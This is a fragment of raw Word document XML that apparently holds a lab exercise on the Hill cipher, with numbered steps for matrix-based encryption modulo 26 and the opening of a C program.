        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>PH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ER</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H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>echn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e 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S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ore </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">3x3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">key k </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n an array</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ore </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">3x3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s of key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nverse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="9"/>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="9"/>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>3. Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>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4. Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">h of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>essage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="340" w:right="609" w:hanging="240"/>
      </w:pPr>
      <w:r>
        <w:t>5. For each cha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>essage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s asc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s sub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h 65 &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ore </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n array c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="340" w:right="3922" w:hanging="240"/>
      </w:pPr>
      <w:r>
        <w:t>6. For each e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>n array</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">c, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>arrays c &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a a. S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ore resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="302" w:right="5179"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>b.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ake</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:t>od</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>26 and s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ore </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n array</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Add array e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and 65 and pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>correspond</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>phe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>chara</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w: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ude&lt;s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ude&lt;s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ck(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>c(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>a[][]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>deno</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es encry</w:t>
      </w:r>
      <w:r>
